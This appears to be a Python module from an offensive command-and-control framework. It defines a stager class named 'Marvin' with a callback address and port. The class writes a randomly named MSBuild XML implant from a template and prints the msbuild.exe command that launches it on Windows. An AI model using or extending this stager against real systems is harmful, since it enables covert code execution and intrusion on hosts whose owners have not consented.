from core.stager import Stager
from core.utils import randomString
from core.utils import print_status,print_good,print_error

class Marvin(Stager):
    def __init__(self):
    	self.name = "Marvin"
    	self.callback_ip = '127.0.0.1'
    	self.callback_port = 9876

    def generate(self):
        import os
        try:
            filepath = "./implants"
            filename = randomString(8)
            with open (os.path.join(filepath, filename+".xml"), "w") as a:
                for path, subdirs, files in os.walk(filepath):
                        f = os.path.join(path, filename)
                        template = open('./core/stagers/templates/msbuild.xml','r')
                        template = template.read()
                        template = template.replace("STRING",filename)
                        a.write(template)
                        print_good("Generated stager successfully")
                        print_status(f"Launch with 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {filename}.xml'")
        except Exception as e:
            print_error("Could not generate {filename}")